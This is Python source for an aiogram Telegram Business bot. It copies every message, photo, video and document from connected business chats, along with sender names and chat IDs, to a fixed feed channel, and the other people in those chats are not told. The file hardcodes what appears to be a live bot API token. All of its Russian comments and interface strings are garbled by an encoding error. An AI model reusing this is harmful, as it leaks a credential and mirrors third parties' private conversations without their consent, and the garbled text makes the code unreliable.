import os
import logging
from aiogram import Bot, Dispatcher, types, F, Router
from aiogram.enums import ParseMode
from aiogram.filters import Command
from aiogram.types import BusinessConnection, BusinessMessagesDeleted, Message
from aiogram.client.default import DefaultBotProperties
import asyncio

# –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ª–æ–≥–æ–≤
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
)
logger = logging.getLogger(__name__)

# –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è
API_TOKEN = "6288342219:AAELGG0RjPjppMvuCS7xdPgW4F4w7Eq-5ls"
FEED_CHANNEL_ID = -1001552937015

# –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –±–æ—Ç–∞ —Å –ø—Ä–∞–≤–∏–ª—å–Ω—ã–º–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞–º–∏
bot = Bot(
    token=API_TOKEN,
    default=DefaultBotProperties(parse_mode=ParseMode.HTML)
)

# –°–æ–∑–¥–∞–µ–º –¥–∏—Å–ø–µ—Ç—á–µ—Ä –∏ —Ä–æ—É—Ç–µ—Ä
dp = Dispatcher()
business_router = Router()
dp.include_router(business_router)

# –ì–ª–æ–±–∞–ª—å–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –¥–ª—è —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –±–∏–∑–Ω–µ—Å-—Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è–º–∏
active_connections = {}


@business_router.business_connection()
async def handle_business_connect(business_connection: BusinessConnection):
    """–û–±—Ä–∞–±–æ—Ç—á–∏–∫ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –Ω–æ–≤–æ–≥–æ –±–∏–∑–Ω–µ—Å-—Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è"""
    logger.info(f"–ù–æ–≤–æ–µ –±–∏–∑–Ω–µ—Å-—Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ: {business_connection.id}")
    active_connections[business_connection.id] = business_connection
    await bot.send_message(
        chat_id=business_connection.user_chat_id,
        text=" –í–∞—à —á–∞—Ç –ø–æ–¥–∫–ª—é—á–µ–Ω ",
    )


@business_router.message(F.business_connection_id != None)
async def handle_business_message(message: Message):
    """–û–±—Ä–∞–±–æ—Ç—á–∏–∫ —Å–æ–æ–±—â–µ–Ω–∏–π –∏–∑ –±–∏–∑–Ω–µ—Å-—á–∞—Ç–æ–≤"""
    try:
        # –ü—Ä–æ–ø—É—Å–∫–∞–µ–º —Å–ª—É–∂–µ–±–Ω—ã–µ —Å–æ–æ–±—â–µ–Ω–∏—è
        if not message.text and not message.caption and not message.media:
            return

        # –ü–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –±–∏–∑–Ω–µ—Å-—Å–æ–µ–¥–∏–Ω–µ–Ω–∏–∏
        connection_id = message.business_connection_id
        connection = active_connections.get(connection_id)

        if not connection:
            logger.warning(f"–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ: {connection_id}")
            return

        # –ü–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —á–∞—Ç–µ
        chat_id = message.chat.id
        try:
            chat_info = await bot.get_chat(chat_id)
        except Exception as e:
            logger.error(f"–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è —á–∞—Ç–∞ {chat_id}: {str(e)}")
            chat_info = types.Chat(id=chat_id, type="unknown", title="–ù–µ–∏–∑–≤–µ—Å—Ç–Ω—ã–π —á–∞—Ç")

        # –§–æ—Ä–º–∞—Ç–∏—Ä—É–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ–± –æ—Ç–ø—Ä–∞–≤–∏—Ç–µ–ª–µ
        sender = message.from_user
        sender_name = format_name(sender)
        sender_link = f"@{sender.username}" if sender and sender.username else f"tg://user?id={sender.id}" if sender else "N/A"

        # –§–æ—Ä–º–∞—Ç–∏—Ä—É–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —á–∞—Ç–µ
        if chat_info.type == "private":
            chat_title = f"üë§ {sender_name}" if sender_name else "üë§ –õ–∏—á–Ω—ã–π —á–∞—Ç"
        else:
            chat_title = f"üë• {chat_info.title}" if hasattr(chat_info,
                                                           'title') and chat_info.title else "üë• –ì—Ä—É–ø–ø–æ–≤–æ–π —á–∞—Ç"

        # –§–æ—Ä–º–∞—Ç–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –¥–ª—è –∫–∞–Ω–∞–ª–∞
        caption = (
            f"üì© <b>–°–æ–æ–±—â–µ–Ω–∏–µ –∏–∑:</b> {chat_title}\n"
            f"üë§ <b>–û—Ç–ø—Ä–∞–≤–∏—Ç–µ–ª—å:</b> <a href='{sender_link}'>{sender_name or '–ê–Ω–æ–Ω–∏–º'}</a>\n"
            f"üÜî <b>–ß–∞—Ç ID:</b> <code>{chat_id}</code>\n\n"
        )

        # –î–æ–±–∞–≤–ª—è–µ–º —Ç–µ–∫—Å—Ç —Å–æ–æ–±—â–µ–Ω–∏—è
        if message.text:
            caption += message.text
        elif message.caption:
            caption += message.caption

        # –ü–µ—Ä–µ—Å—ã–ª–∞–µ–º –≤ –∫–∞–Ω–∞–ª
        if message.photo:
            await bot.send_photo(
                chat_id=FEED_CHANNEL_ID,
                photo=message.photo[-1].file_id,
                caption=caption
            )
        elif message.video:
            await bot.send_video(
                chat_id=FEED_CHANNEL_ID,
                video=message.video.file_id,
                caption=caption
            )
        elif message.document:
            await bot.send_document(
                chat_id=FEED_CHANNEL_ID,
                document=message.document.file_id,
                caption=caption
            )
        elif message.sticker:
            await bot.send_message(
                chat_id=FEED_CHANNEL_ID,
                text=f"{caption}–°—Ç–∏–∫–µ—Ä: {message.sticker.emoji}",
            )
        else:
            await bot.send_message(
                chat_id=FEED_CHANNEL_ID,
                text=caption,
                disable_web_page_preview=True
            )

        logger.info(f"–ü–µ—Ä–µ—Å–ª–∞–Ω–æ —Å–æ–æ–±—â–µ–Ω–∏–µ –∏–∑ —á–∞—Ç–∞ {chat_id}")

    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏: {str(e)}", exc_info=True)


@business_router.deleted_business_messages()
async def handle_deleted_messages(event: BusinessMessagesDeleted):
    """–û–±—Ä–∞–±–æ—Ç—á–∏–∫ —É–¥–∞–ª–µ–Ω–Ω—ã—Ö —Å–æ–æ–±—â–µ–Ω–∏–π"""
    logger.info(f"–£–¥–∞–ª–µ–Ω—ã —Å–æ–æ–±—â–µ–Ω–∏—è –≤ —á–∞—Ç–µ {event.chat_id}")


def format_name(user: types.User) -> str:
    """–§–æ—Ä–º–∞—Ç–∏—Ä—É–µ—Ç –∏–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è"""
    if not user:
        return "–ê–Ω–æ–Ω–∏–º"
    name = user.first_name or ""
    if user.last_name:
        name += f" {user.last_name}"
    return name.strip()


@dp.message(Command("connections"))
async def list_connections(message: types.Message):
    """–ü–æ–∫–∞–∑—ã–≤–∞–µ—Ç –∞–∫—Ç–∏–≤–Ω—ã–µ –±–∏–∑–Ω–µ—Å-—Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è"""
    if not active_connections:
        await message.answer(" –ù–µ—Ç –∞–∫—Ç–∏–≤–Ω—ã—Ö —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–π")
        return

    text = " –ê–∫—Ç–∏–≤–Ω—ã–µ –±–∏–∑–Ω–µ—Å-—Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è:\n\n"
    for conn_id, conn in active_connections.items():
        text += f"‚Ä¢ ID: <code>{conn_id}</code>\n"
        text += f"  –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: <code>{conn.user_chat_id}</code>\n"
        text += f"  –î–∞—Ç–∞: {conn.date}\n\n"

    await message.answer(text)


@dp.message(Command("help", "start"))
async def send_help(message: types.Message):
    """–û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—é –ø–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—é"""
    help_text = (
        " <b>–ë–æ—Ç –¥–ª—è –ø–µ—Ä–µ—Å—ã–ª–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏–π</b>\n\n"
        "–î–ª—è —Ä–∞–±–æ—Ç—ã –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ:\n"
        "1. –î–æ–±–∞–≤–∏—Ç—å –±–æ—Ç–∞ –∫–∞–∫ –æ–±—Ä–∞–±–æ—Ç—á–∏–∫ —Å–æ–æ–±—â–µ–Ω–∏–π –≤ –Ω–∞—Å—Ç—Ä–æ–π–∫–∞—Ö Telegram Business\n"
        "2. –ü–æ–¥–∫–ª—é—á–∏—Ç—å –Ω—É–∂–Ω—ã–µ —á–∞—Ç—ã –≤ —Ä–∞–∑–¥–µ–ª–µ '–ë–æ—Ç—ã-–æ–±—Ä–∞–±–æ—Ç—á–∏–∫–∏'\n\n"
        "–ö–æ–º–∞–Ω–¥—ã:\n"
        "/connections - –ü–æ–∫–∞–∑–∞—Ç—å –∞–∫—Ç–∏–≤–Ω—ã–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è\n"
        "/help - –≠—Ç–∞ —Å–ø—Ä–∞–≤–∫–∞"
    )
    await message.answer(help_text)


async def main():
    logger.info("–ó–∞–ø—É—Å–∫ –±–∏–∑–Ω–µ—Å-–±–æ—Ç–∞...")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())